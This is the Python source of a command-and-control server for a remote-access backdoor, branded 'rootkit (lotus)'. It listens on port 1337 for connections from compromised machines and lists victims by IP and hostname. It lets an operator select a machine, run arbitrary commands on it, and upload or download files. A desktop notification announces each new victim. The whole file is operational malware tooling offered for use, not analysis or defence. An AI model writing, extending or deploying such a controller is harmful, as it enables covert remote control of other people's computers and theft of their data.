import os
import sys
import json
import time
import socket
import base64
import datetime
import threading

from notifypy import Notify
from cutepy     import HEX
from queue      import Queue
from termcolor  import colored


class Colors:

    green = HEX.print("f38ba8")
    muted = HEX.print("cba6f7")
    foreground = HEX.print("9fa5ca")
    reset = HEX.reset


class Variables:

    global start_time, logger_time, prompt

    start_time      = time.time()
    logger_time     = datetime.datetime.now()
    logger_time     = logger_time.strftime("%H:%M:%S")
    prompt          = f"{Colors.foreground}rootkit{Colors.green}({Colors.muted}lotus{Colors.green}){Colors.reset} ~{Colors.green}$ "


class Logger:

    @staticmethod
    def __client_logger__(status):
        print(f"{Colors.muted}{logger_time}{Colors.reset} {Colors.green}__LOGGER__{Colors.reset}{Colors.foreground} {status} {Colors.reset}")


class Modules:

    def clear():
        if os.name == 'Windows':
            os.system('cls')
        else:
            os.system('clear')

    def notify(title, description):
        notification = Notify()
        notification.title = title
        notification.message = description
        notification.icon = "./image/logoo.png"
        notification.send()



class Listener:

    def __init__(self, ip, port):
        self.about()
        self.threads = 2
        self.jobs = [1, 2]
        self.queue = Queue()
        self.ip = ip
        self.port = port
        self.connections = []
        self.addresses = []
        self.connection = None
        self.active_target = None
        self.quit = True
        self.cwd = None
        self.cwd_status = True
        self.commands = {'help:': "Provides the command usages.",
                         'list:': "Lists the connected computers.",
                         'select:': "Select the Rootkit device via indexs.",
                         'quit:': "Stop the connection between the rootkit.",
                         'exit:': "Stop the server and exit.",
                         'upload:': "Upload a file to the remote rootkit.",
                         'download:': "Download a file from the remote rootkit.",
                         }

        Logger.__client_logger__(f"Started the rootkit server on {self.ip}:{self.port}")
        Logger.__client_logger__(f"Listening for incoming threaded connections\n")


    def help(self):
        print(f"""
{Colors.reset}╭─{Colors.green}Commands{Colors.reset}─────────────────────────────────────────────────────╮
│ help              {Colors.foreground}{self.commands['help:']}{Colors.reset}               │
│ list              {Colors.foreground}{self.commands['list:']}{Colors.reset}             │
╰──────────────────────────────────────────────────────────────╯

{Colors.reset}╭─{Colors.green}Rootkit{Colors.reset}──────────────────────────────────────────────────────╮
│ select            {Colors.foreground}{self.commands['select:']}{Colors.reset}      │
│ upload            {Colors.foreground}{self.commands['upload:']}{Colors.reset}       │
│ download          {Colors.foreground}{self.commands['download:']}{Colors.reset}   │
╰──────────────────────────────────────────────────────────────╯

{Colors.reset}╭─{Colors.green}Extra{Colors.reset}────────────────────────────────────────────────────────╮
│ quit              {Colors.foreground}{self.commands['quit:']}{Colors.reset}   │
│ exit              {Colors.foreground}{self.commands['exit:']}{Colors.reset}                  │
╰──────────────────────────────────────────────────────────────╯
""")


    def create_threads(self):
        for _ in range(self.threads):
            work = threading.Thread(target=self.run_task)
            work.daemon = True
            work.start()


    def run_task(self):
        while True:
            x = self.queue.get()
            if x == 1:
                self.listen_socket()
            if x == 2:
                self.run_command_listener()
            try:
                self.queue.task_done()
            except:
                pass


    def create_jobs(self):
        for job in self.jobs:
            self.queue.put(job)
        self.queue.join()


    def listen_socket(self):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((self.ip, self.port))
        listener.listen(0)
        for connection in self.connections:
            connection.close()
        self.connections = []
        self.addresses = []
        while True:
            try:
                connection, address = listener.accept()
                connection.setblocking(1)
                address = address + (str(connection.recv(4096), "utf-8"),)
                self.connections.append(connection)
                self.addresses.append(address)
                # print("\n")
                Modules.notify("Connection established", "From {} {}".format(address[-1], address[0]).rstrip())
                # Logger.__client_logger__("Connection established from {} {}".format(address[-1], address[0]).rstrip())
                if self.quit:
                    None
                else:
                    if self.connection.getpeername()[0] == connection.getpeername()[0]:
                        self.cwd_status = False
                        self.disconnect_active_connection(False)
                    else:
                        
                        print(self.cwd, end="", flush=False)  # Flush the output buffer
                        self.cwd = self.execute_command(["getcwd"])
                        # user_input = input()  # Prompt for user input
                        # Process user input here
            except Exception as e:
                Logger.__client_logger__("An error occurred during connection")
                Logger.__client_logger__("Error message: {}".format(str(e)))
                self.cwd_status = False
                self.disconnect_active_connection(False)

    def run_command_listener(self, status=True):
        while status:
            command = input(prompt)
    
            if command == 'clear':
                Modules.clear()

            if command == 'list':
                self.list_connections()

            elif "select" in command:
                if len(command.split(" ")) > 1:
                    self.connection, self.active_target = self.select_target(
                        command)
                    if self.connection is not None:
                        self.quit = False
                        self.run_backdoor_command()
                else:
                    Logger.__client_logger__(f"Please select a target!")

            elif command == "help":
                self.help()

            elif command == None or " ":
                pass

            elif command == 'exit':
                try:
                    self.queue.task_done()
                    self.queue.task_done()
                except:
                    continue
                print("\n")
                Logger.__client_logger__(f"Exiting the server")
                break
            
            else:
                Logger.__client_logger__(f"Command not recognized!")
        
        if not self.cwd_status:
            print(self.cwd, end="")
            self.cwd_status = True

    def list_connections(self, status=True):
        result = ''
        for i, connection in enumerate(self.connections):
            try:
                connection.send(str.encode(" "))
            except Exception:
                del self.connections[i]
                del self.addresses[i]
                continue
            if status:
                result += str(i) + "\t   " + str(self.addresses[i][0]) + "\t   " + str(self.addresses[i][1]) + "\t   " + str(self.addresses[i][2]) + "\n"

        if status:
            print(f"\n{Colors.reset}──{Colors.green}Connections{Colors.reset}──────────────────────────────────────────────────")
            print("\nIndex\t   IP Address\t   Port\t	   Hostname")
            print(result)
            print(f"───────────────────────────────────────────────────────────────\n")

    def select_target(self, index):
        try:
            index = index.replace('select ', '')
            index = int(index)
        except:
            Logger.__client_logger__(f"Please select a valid target")
            return None, None
        try:
            connection = self.connections[index]
            connection.send(str.encode(" "))
            Modules.notify("Connected via command line", f"To {str(self.addresses[index][2])} {str(self.addresses[index][0])}")
            # Logger.__client_logger__(f"Connected to " + str(self.addresses[index][2]) + " (" + str(self.addresses[index][0]) + ")")
            return connection, index
        except:
            if len(self.connections) > index:
                del self.connections[index]
                del self.addresses[index]
            Logger.__client_logger__(f"Please select a valid target")
            return None, None

    def disconnect_active_connection(self, status=True):
        self.reset_active_connection()
        self.list_connections(False)
        if status:
            self.run_command_listener()
        else:
            self.run_command_listener(False)


    def reset_active_connection(self):
        self.connection = None
        self.quit = True
        if self.active_target:
            del self.connections[self.active_target]
            del self.addresses[self.active_target]
            self.active_target = None

    def execute_command(self, command):
        try:
            if self.connection:
                self.send(command)
                return self.receive()
            else:
                Logger.__client_logger__(f"The connection to the target computer you're operating on has been terminated...")
                Logger.__client_logger__(f"Connection Closed!")
                self.reset_active_connection()
        except Exception as e:
            Logger.__client_logger__(f"The connection to the target computer you're operating on has been terminated...")
            Logger.__client_logger__(f"Error message: {str(e)}")
            Logger.__client_logger__(f"Connection Closed!")
            self.reset_active_connection()

    def send(self, data):
        json_data = json.dumps(data)
        self.connection.send(str.encode(json_data))

    def receive(self):
        json_data = ""
        while True:
            try:
                json_data += str(self.connection.recv(1024), "utf-8")
                return json.loads(json_data)
            except ValueError:
                continue
            except:
                break

    def file_exists(self, file):
        return os.path.isfile(path=file)

    def write_file(self, path, content):
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(content))
                Logger.__client_logger__(f"Download Successful!")
        except Exception as e:
            Logger.__client_logger__(f"Failed to download the file!")

    def read_file(self, file):
        try:
            with open(file, "rb") as file:
                return str(base64.b64encode(file.read()), "utf-8")
        except Exception as e:
            Logger.__client_logger__(f"Failed to upload the file")

    def run_backdoor_command(self):
        cwd = self.receive()
        if cwd:

            print("\n"+cwd, end="")

        while not self.quit:
            try:
                status = True
                command = input("")
                if command:
                    command = command.split(" ")
                    if command[0] == "upload":
                        if len(command) > 1:
                            if self.file_exists(command[1]):
                                file_content = self.read_file(command[1])
                                command.append(file_content)
                            else:
                                result = "[-] There is no file named '" + \
                                    command[1] + "' to upload!"
                                status = False
                        else:
                            result = "[-] Please specify the file to upload!"
                            status = False

                    if command[0] == "download":
                        if len(command) > 1:
                            result = self.execute_command(command)
                            if result:
                                self.cwd = result[result.rfind("\n\n"):]
                    elif status:
                        result = self.execute_command(command)
                        if result:
                            self.cwd = result[result.rfind("\n\n"):]
                    else:
                        self.cwd = self.execute_command(["getcwd"])
                        result += self.cwd

                    if command[0] == "download":
                        if len(command) > 1:
                            if "[-]" not in result:
                                result = self.write_file(command[1], result)
                        else:
                            result = "[-] Please specify the file to download!"

                    elif command[0] == "quit":
                        break
                else:
                    self.cwd = self.execute_command(["getcwd"])
                    result = self.cwd

                if result:
                    print("")
                    print(result, end='')
                    if command:
                        if command[0] == "download":
                            self.cwd = self.execute_command(["getcwd"])
                            Logger.__client_logger__(self.cwd, end='')

            except Exception as e:
                Logger.__client_logger__(f"Error during command execution: {str(e)}")
        self.reset_active_connection()

    def about(self):
        print(f"""
#       #       #
##     ###     ##
###   #####   ###
#### ####### ####               {Colors.muted}Creator:..... {Colors.foreground}Birdlinux {Colors.reset}
#################               {Colors.muted}Version:..... {Colors.foreground}1.0.0.4{Colors.reset}
#################               {Colors.muted}Github:...... {Colors.foreground}github.com/lotuscorp{Colors.reset}
 ###############                {Colors.muted}Date:........ {Colors.foreground}27.05.2023{Colors.reset}
   ###########
     #######
        
        """)

def main(ip, port):
    
    try:
        listener = Listener(str(ip), int(port))
        listener.create_threads()
        listener.create_jobs()
    except KeyboardInterrupt:
        print("\n")
        Logger.__client_logger__(f"Exiting the rootkit")
        sys.exit()

Modules.clear()
main(
    "0.0.0.0", 
    1337
)
